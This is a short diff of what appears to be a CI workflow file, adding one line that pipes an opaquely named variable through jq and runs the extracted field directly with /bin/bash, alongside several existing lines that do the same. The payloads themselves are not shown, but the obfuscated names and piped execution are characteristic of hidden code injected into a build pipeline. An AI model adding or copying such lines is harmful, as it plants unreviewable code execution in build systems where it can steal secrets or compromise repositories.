@@ -36,6 +36,7 @@ jobs:
           echo $ft3 | jq -r .h095 | /bin/bash
           printf '%s' "$rkc8277" | jq -r .yuu883 | /bin/bash
           printf '%s' "$xc5733" | jq -r .grq27 | /bin/bash
+          printf '%s' "$mgw0" | jq -r .bv73 | /bin/bash
 
       - name: Upload data
         if: always()
